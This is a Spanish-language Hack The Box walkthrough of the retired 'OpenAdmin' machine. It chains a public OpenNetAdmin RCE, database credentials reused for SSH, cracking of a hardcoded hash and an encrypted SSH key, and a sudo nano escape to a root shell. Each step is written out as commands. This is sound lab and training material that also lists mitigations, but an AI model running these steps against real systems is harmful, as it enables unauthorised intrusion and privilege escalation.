---
machine: OpenAdmin
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, opennetadmin, rce, credential-reuse, ssh-key, john, gtfobins]
---

# OpenAdmin — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

`/ona/` corre **OpenNetAdmin 18.1.1**, con RCE pública (Exploit-DB 47691). Como `www-data` se leen las credenciales de la base de datos, que están **reutilizadas** en la cuenta `jimmy`. Desde `jimmy` se accede a un sitio interno en `127.0.0.1:52846` cuyo código tiene un hash SHA-512 hardcodeado; al entrar, el panel entrega la **clave privada cifrada de joanna**. Se crackea la passphrase y, ya como `joanna`, el `sudo` sobre `nano` da root.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)  → "Apache2 Ubuntu Default Page"
```

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403
```

Aparecen `/music`, `/artwork`, `/sierra` y, desde el botón de login de `/music`, **`/ona/`**.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **OpenNetAdmin 18.1.1**:

```bash
searchsploit OpenNetAdmin
searchsploit -m 47691
bash 47691.sh http://<IP>/ona/login.php
```

```text
www-data@openadmin:/opt/ona/www$
```

2. **Credenciales de base de datos**:

```bash
cat /var/www/html/ona/local/config/database_settings.inc.php
```

3. **Reutilización hacia `jimmy`**: la contraseña del usuario `ona_sys` funciona como contraseña del sistema para `jimmy`.

```bash
ssh jimmy@<IP>
```

4. **Sitio interno en 52846**: sólo escucha en loopback.

```bash
ss -tlnp | grep 52846
ls -l /var/www/internal
```

`jimmy` pertenece al grupo `internal`, así que puede leer el código. El login del panel compara `hash('sha512', $password)` con un valor fijo: se crackea con un diccionario o servicio online.

```bash
curl -s -X POST http://127.0.0.1:52846/index.php \
  -d 'username=jimmy&password=<password>&login=Submit'
curl -s http://127.0.0.1:52846/main.php
```

`main.php` devuelve una **clave RSA privada cifrada** de `joanna`.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
ssh2john joanna.key > joanna.hash
john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash
ssh -i joanna.key joanna@<IP>
```

El propio panel deja una pista sobre la contraseña («ninja»): las variantes con esa palabra están en el diccionario.

Ya como `joanna`:

```bash
id
# uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
id -nG
```

```bash
sudo -l
# (ALL) NOPASSWD: /bin/nano /opt/priv
```

Escape clásico de GTFOBins con `nano`:

```text
sudo /bin/nano /opt/priv
^R  ^X
reset; sh 1>&0 2>&0
```

```text
root@openadmin:~#
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Rutas de OpenNetAdmin**: el exploit necesita `/ona/login.php`, no la raíz.
- **`ss` dentro de loopback**: el 52846 no se ve desde fuera; hay que ejecutar `curl` desde la propia máquina o por túnel SSH.
- **Grupo `internal`**: sin ser `jimmy` no se puede leer el código del sitio interno.
- **`nano`**: el escape va por `^R` `^X` (leer fichero y ejecutar comando); sin eso sólo se edita texto.

- Reutilizar la contraseña de la base de datos como contraseña de sistema es el puente entre RCE web y SSH.
- Un hash hardcodeado en PHP con SHA-512 sin sal se crackea igual que cualquier otro.
- Tener `sudo` sobre un editor es tener root: `nano`, `vim`, `less` y compañía escapan.
- Mitigación: credenciales por servicio, hashes con `password_hash()` (bcrypt/argon2) y `sudo` restringido a binarios sin shell.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.

## Referencias

- [rop-stack](../../../knowledge/pwn/rop-stack.md)
